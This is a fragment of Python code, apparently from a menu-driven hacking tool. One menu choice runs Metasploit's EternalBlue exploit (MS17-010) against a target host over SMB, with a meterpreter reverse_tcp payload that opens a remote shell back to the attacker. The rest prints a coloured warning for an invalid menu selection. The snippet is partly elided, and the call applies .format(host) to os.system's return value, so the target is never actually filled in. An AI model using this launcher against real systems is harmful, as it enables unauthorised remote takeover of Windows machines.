        ...
        while True:
            try:
                ...
                if choice == '1':
                    try:
                        print("\n")
                        process = os.system('msfdb start; msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {0}; set RPORT 445; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST eth0; set LPORT 8443; set VERBOSE true; exploit"').format(host)
                        return process
                    except:
                        break
                elif choice == '0':
        ...
        while True:
            try:
                ...
                if choice == '1':
                    ...
                    print("\n")
                    warn = bcolors.ENDC + "   ~{ " + bcolors.RED + "Poor Choice Of Selection!!!. Please Select " + bcolors.DARKCYAN + "0.) 1.) or 2.) " + bcolors.ENDC +  "}~" + bcolors.ENDC
                    for w in warn:
                        sys.stdout.write(w)
                        sys.stdout.flush()
                        time.sleep(0.09)
